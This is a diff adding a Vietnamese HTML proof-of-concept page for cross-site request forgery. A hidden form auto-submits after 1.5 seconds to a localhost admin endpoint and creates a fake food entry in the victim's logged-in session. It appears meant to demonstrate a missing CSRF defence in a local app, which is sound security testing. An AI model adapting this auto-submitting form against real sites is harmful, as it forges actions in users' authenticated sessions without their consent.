@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <title>CSRF Demo Attack Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body { font-family: system-ui, Arial; margin: 40px; }
+    .card { max-width: 720px; border: 1px solid #ddd; border-radius: 12px; padding: 24px; box-shadow: 0 6px 24px rgba(0,0,0,0.08); }
+    .muted { color: #666; }
+    code { background: #f5f5f5; padding: 2px 6px; border-radius: 6px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>CSRF Demo: Tự động tạo món ăn</h2>
+    <p class="muted">Trang này sẽ tự động gửi một POST request tới <code>http://127.0.0.1:8000/admin/foods/create</code> để tạo một món ăn giả mạo nếu bạn đang đăng nhập admin ở ứng dụng đích.</p>
+
+    <form id="attackForm" action="http://127.0.0.1:8000/admin/foods/create" method="POST">
+      <input type="hidden" name="name" value="CSRF - Món độc hại" />
+      <input type="hidden" name="calories" value="999" />
+      <input type="hidden" name="protein" value="0" />
+      <input type="hidden" name="carbs" value="0" />
+      <input type="hidden" name="fat" value="0" />
+      <input type="hidden" name="unit" value="phần" />
+      <input type="hidden" name="ai_slug" value="csrf_poc" />
+    </form>
+
+    <p>Đang chuẩn bị gửi form thay bạn... (2s)</p>
+    <button onclick="document.getElementById('attackForm').submit()">Gửi ngay</button>
+
+    <hr />
+    <p class="muted">
+      Ghi chú:
+      <br />
+      - Nếu cookie của app đích đặt <code>SameSite=Strict</code> hoặc <code>Lax</code>, trình duyệt có thể chặn POST cross-site.
+      <br />
+      - Đây chỉ là minh họa bảo mật. Không dùng cho mục đích xấu.
+    </p>
+  </div>
+
+  <script>
+    // Khi load trang: sinh giá trị ngẫu nhiên để tránh trùng ai_slug
+    window.addEventListener('load', function () {
+      const form = document.getElementById('attackForm');
+      const aiSlugInput = form.querySelector('input[name="ai_slug"]');
+      const nameInput = form.querySelector('input[name="name"]');
+      const suffix = Math.random().toString(36).slice(2, 8);
+
+      // Gán giá trị ngẫu nhiên để tránh UniqueViolation
+      aiSlugInput.value = `csrf_poc_${suffix}`;
+      nameInput.value = `CSRF - Món độc hại ${suffix}`;
+
+      // Tự động gửi sau 1.5s để mô phỏng người dùng bị lừa xem trang
+      setTimeout(function(){
+        form.submit();
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
